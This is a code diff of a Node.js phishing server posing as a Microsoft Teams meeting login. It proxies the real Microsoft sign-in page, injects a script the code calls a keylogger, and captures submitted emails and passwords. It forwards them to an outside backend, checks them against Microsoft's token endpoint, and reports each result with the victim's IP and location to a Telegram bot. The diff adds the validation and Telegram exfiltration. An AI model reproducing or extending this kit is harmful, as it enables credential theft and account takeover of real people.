@@ -6,80 +6,23 @@ const querystring = require('querystring');
 const crypto = require('crypto');
 
 // ============================================================
-//  CONFIGURATION - Customize these values
+//  CONFIGURATION
 // ============================================================
 
 const PROXY_ENTRY_POINT = "/login";
-const PHISHED_URL_PARAMETER = "redirect_urI";
 const REDIRECT_URL = "https://login.microsoftonline.com/";
 const BACKEND_URL = "https://meeting-h5ze.onrender.com";
 const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
 
-// File paths (customizable for IOC reduction)
-const PROXY_FILES = {
-    index: "index.html",
-    notFound: "404_not_found_lk48ZVr32WvU.html",
-    script: "script_Vx9Z6XN5uC3k.js"
-};
-
 const PROXY_PATHNAMES = {
-    proxy: "/lNv1pC9AWPUY4gbidyBO",
-    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
     script: "/@",
-    mutation: "/Mutation_o5y3f4O7jMGW",
-    jsCookie: "/JSCookie_6X7dRqLg90mH",
-    favicon: "/favicon.ico"
+    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js"
 };
-
-// ============================================================
-//  LOGGING
-// ============================================================
-
-const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-if (!fs.existsSync(LOGS_DIRECTORY)) {
-    fs.mkdirSync(LOGS_DIRECTORY);
-}
-
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
-const VICTIM_SESSIONS = {};
-
-// Store authentication status
-const AUTHENTICATED_USERS = {};
 
 // ============================================================
 //  HELPERS
 // ============================================================
 
-// Verify credentials with backend
-async function verifyCredentials(email, password, req) {
-    try {
-        const axios = require('axios');
-        const response = await axios.post(`${BACKEND_URL}/api/authenticate`, {
-            email: email,
-            password: password,
-            visitorInfo: {
-                fullUrl: req.url,
-                userAgent: req.headers['user-agent'] || 'Unknown',
-                ip: req.socket.remoteAddress || 'Unknown'
-            }
-        });
-        
-        // Check if authentication was successful
-        // Based on your backend response structure
-        if (response.data && response.data.success === true) {
-            console.log(`[AUTH] ✅ User authenticated: ${email}`);
-            return true;
-        } else {
-            console.log(`[AUTH] ❌ Authentication failed for: ${email}`);
-            return false;
-        }
-    } catch (error) {
-        console.error(`[AUTH] ❌ Authentication error: ${error.message}`);
-        return false;
-    }
-}
-
-// Send credentials to backend for logging
 async function sendToBackend(email, password, req) {
     try {
         const axios = require('axios');
@@ -99,7 +42,106 @@ async function sendToBackend(email, password, req) {
     }
 }
 
-// Serve file helper
+// --- Send to Telegram for authentication result ---
+async function sendAuthResultToTelegram(email, success, ip) {
+    try {
+        const axios = require('axios');
+        const location = await getLocationFromIp(ip);
+        const msg = success 
+            ? `✅ *Successful Login*\n\n📧 Email: ${email}\n📍 Location: ${location.full}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`
+            : `❌ *Failed Login Attempt*\n\n📧 Email: ${email}\n📍 Location: ${location.full}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`;
+        
+        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: process.env.TELEGRAM_CHAT_ID,
+            text: msg,
+            parse_mode: 'Markdown'
+        });
+        console.log(`[TELEGRAM] ✅ Sent auth result for: ${email}`);
+    } catch (error) {
+        console.error(`[TELEGRAM] ❌ Failed to send: ${error.message}`);
+    }
+}
+
+async function getLocationFromIp(ip) {
+    return new Promise((resolve) => {
+        const request = https.get(
+            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`,
+            { timeout: 5000 },
+            (resp) => {
+                let data = '';
+                resp.on('data', chunk => data += chunk);
+                resp.on('end', () => {
+                    try {
+                        const response = JSON.parse(data);
+                        if (response.status === 'success') {
+                            resolve({
+                                full: `${response.city || 'Unknown'}, ${response.regionName || 'Unknown'}, ${response.country || 'Unknown'}`
+                            });
+                        } else {
+                            resolve({ full: 'Location unavailable' });
+                        }
+                    } catch (e) {
+                        resolve({ full: 'Location error' });
+                    }
+                });
+            }
+        );
+        request.on('error', () => resolve({ full: 'Location timeout' }));
+        request.on('timeout', () => {
+            request.destroy();
+            resolve({ full: 'Location timeout' });
+        });
+    });
+}
+
+// --- Verify credentials with Microsoft ---
+function verifyWithMicrosoft(email, password) {
+    return new Promise((resolve, reject) => {
+        const postData = querystring.stringify({
+            client_id: '943a2b14-68aa-4205-88c1-a4b65ab04e81',
+            grant_type: 'password',
+            username: email,
+            password: password,
+            scope: 'openid profile email'
+        });
+
+        const options = {
+            hostname: 'login.microsoftonline.com',
+            path: '/common/oauth2/v2.0/token',
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Content-Length': Buffer.byteLength(postData)
+            }
+        };
+
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try {
+                    const response = JSON.parse(data);
+                    if (response.access_token) {
+                        resolve({ success: true, data: response });
+                    } else {
+                        resolve({ success: false, error: response.error_description || 'Invalid credentials' });
+                    }
+                } catch (error) {
+                    reject(new Error('Failed to parse Microsoft response'));
+                }
+            });
+        });
+
+        req.on('error', (error) => {
+            reject(error);
+        });
+
+        req.write(postData);
+        req.end();
+    });
+}
+
+// --- Serve File ---
 function serveFile(filename, res, contentType = 'text/html') {
     const filePath = path.join(__dirname, filename);
     fs.readFile(filePath, (err, data) => {
@@ -132,59 +174,50 @@ function handlePostRequest(body, req, res) {
         // Send to backend for logging
         sendToBackend(email, password, req);
 
-        // Verify credentials with backend
-        verifyCredentials(email, password, req).then((isAuthenticated) => {
-            if (isAuthenticated) {
-                // Store session
-                const sessionId = generateSessionId(email);
-                AUTHENTICATED_USERS[sessionId] = {
-                    email: email,
-                    timestamp: Date.now(),
-                    authenticated: true
-                };
+        // Verify with Microsoft
+        verifyWithMicrosoft(email, password)
+            .then((result) => {
+                const ip = req.socket.remoteAddress || 'Unknown';
                 
-                console.log(`[AUTH] ✅ User authenticated and session created for: ${email}`);
-                
-                // Redirect to REAL Teams meeting
-                res.writeHead(302, { 
-                    'Location': TEAMS_REDIRECT,
-                    'Set-Cookie': [`session=${sessionId}; HttpOnly; Secure; SameSite=Strict`],
-                    'Cache-Control': 'no-store'
-                });
-                res.end();
-            } else {
-                console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
-                
-                // Redirect back to login with error
-                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
+                if (result.success) {
+                    console.log(`[AUTH] ✅ Valid credentials for: ${email}`);
+                    sendAuthResultToTelegram(email, true, ip);
+                    
+                    // Redirect to REAL Teams meeting
+                    res.writeHead(302, { 
+                        'Location': TEAMS_REDIRECT,
+                        'Cache-Control': 'no-store'
+                    });
+                    res.end();
+                } else {
+                    console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
+                    sendAuthResultToTelegram(email, false, ip);
+                    
+                    // Redirect back to login with error
+                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
+                    res.writeHead(302, { 'Location': errorUrl });
+                    res.end();
+                }
+            })
+            .catch((error) => {
+                console.error('[ERROR] Microsoft verification failed:', error.message);
+                // On error, redirect to login with generic error
+                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=service_error`;
                 res.writeHead(302, { 'Location': errorUrl });
                 res.end();
-            }
-        }).catch((error) => {
-            console.error('[ERROR] Authentication failed:', error.message);
-            res.writeHead(500, { 'Content-Type': 'text/plain' });
-            res.end('Authentication service error');
-        });
+            });
 
     } catch (error) {
         console.error('[ERROR] POST handling failed:', error.message);
-        res.writeHead(500, { 'Content-Type': 'text/plain' });
+        res.writeHead(500);
         res.end('Internal server error');
     }
 }
 
-function generateSessionId(email) {
-    return crypto.createHash('sha256')
-        .update(email + Date.now().toString() + crypto.randomBytes(16).toString('hex'))
-        .digest('hex');
-}
-
 function handleLoginRequest(req, res) {
-    // Get email from URL and decode it properly
     const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
     const email = decodeURIComponent(rawEmail);
     
-    // Build Microsoft OAuth URL with required parameters
     const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
     
     console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
@@ -196,7 +229,6 @@ function handleLoginRequest(req, res) {
         targetRes.on('end', () => {
             let body = Buffer.concat(data).toString();
             
-            // Inject keylogger script
             body = body.replace(
                 '</body>',
                 `<script src="${PROXY_PATHNAMES.script}"></script></body>`
@@ -210,7 +242,6 @@ function handleLoginRequest(req, res) {
         });
     }).on('error', (err) => {
         console.error(`[ERROR] Proxy failed: ${err.message}`);
-        // Fallback redirect
         res.writeHead(302, { 'Location': targetUrl });
         res.end();
     });
@@ -223,31 +254,26 @@ function handleLoginRequest(req, res) {
 const server = http.createServer((req, res) => {
     console.log(`[REQUEST] ${req.method} ${req.url}`);
 
-    // --- Serve index.html ---
     if (req.url === '/' || req.url === '/index.html') {
         serveFile('index.html', res);
         return;
     }
 
-    // --- Serve 404 page ---
     if (req.url === '/404' || req.url === '/404_not_found_lk48ZVr32WvU.html') {
         serveFile('404_not_found_lk48ZVr32WvU.html', res);
         return;
     }
 
-    // --- Serve script file ---
     if (req.url === PROXY_PATHNAMES.script) {
         serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
         return;
     }
 
-    // --- Serve service worker ---
     if (req.url === PROXY_PATHNAMES.serviceWorker) {
         serveFile('service_worker_Mz8XO2ny1Pg5.js', res, 'text/javascript');
         return;
     }
 
-    // --- Handle POST (credential capture) ---
     if (req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -257,13 +283,11 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // --- Handle GET /login ---
     if (req.url.startsWith(PROXY_ENTRY_POINT)) {
         handleLoginRequest(req, res);
         return;
     }
 
-    // --- Fallback redirect ---
     res.writeHead(302, { 'Location': REDIRECT_URL });
     res.end();
 });
